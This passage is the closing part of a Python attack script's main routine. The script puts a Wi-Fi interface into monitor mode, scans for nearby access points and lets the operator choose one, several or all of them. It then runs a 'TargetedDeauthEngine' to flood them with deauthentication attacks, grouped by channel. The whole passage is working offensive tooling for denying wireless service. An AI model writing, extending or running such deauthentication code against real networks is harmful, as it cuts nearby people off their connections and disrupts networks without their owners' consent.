    signal.signal(signal.SIGINT, cleanup)
    
    # Setup monitor mode
    kill_conflicts()
    start_monitor_mode(base_iface)
    time.sleep(2)
    
    try:
        # Live scan for networks
        ap_list = live_scan(mon_iface, output_csv, args.scan_time)
        
        if should_exit:
            return
        
        if not ap_list:
            print("[!] No Wi-Fi networks found. Exiting...")
            cleanup()
            return
        
        # Initialize deauth engine
        engine = TargetedDeauthEngine(mon_iface)
        
        # Get user selection
        selection = get_user_selection(ap_list, engine)
        
        if should_exit or not selection:
            cleanup()
            return
        
        try:
            # Execute based on selection
            if selection['mode'] == 'single':
                # Clear screen before attack
                os.system('clear')
                display_ap_list(ap_list)
                engine.attack_ap(
                    selection['targets'][0], 
                    selection['duration'], 
                    selection.get('exclude_macs', [])
                )
            elif selection['mode'] == 'multiple':
                # Clear screen before attack
                os.system('clear')
                display_ap_list(ap_list)
                
                # Group selected APs by channel for more efficient attacks
                print(f"\n[📊] APs grouped by channel:")
                channel_map = defaultdict(list)
                for ap in selection['targets']:
                    channel_map[ap.channel].append(ap)
                
                for channel, channel_aps in channel_map.items():
                    print(f"    Channel {channel}: {len(channel_aps)} APs")
                
                engine.attack_multiple_aps(
                    selection['targets'], 
                    selection['duration'], 
                    args.time, 
                    ap_list,
                    selection.get('exclude_macs', [])
                )
            elif selection['mode'] == 'all':
                # Clear screen before attack
                os.system('clear')
                display_ap_list(ap_list)
                # Group by channel for 'all' mode
                channel_map = defaultdict(list)
                for ap in selection['targets']:
                    channel_map[ap.channel].append(ap)
                engine.attack_all_aps(
                    channel_map, 
                    args.time, 
                    ap_list,
                    selection.get('exclude_macs', [])
                )
        
        except KeyboardInterrupt:
            print("\n[!] Program interrupted by user")

        finally:
            engine.cleanup()
        
    except Exception as e:
        print(f"[!] Error: {e}")
    
    finally:
        if not should_exit:
            cleanup()

if __name__ == "__main__":
    main()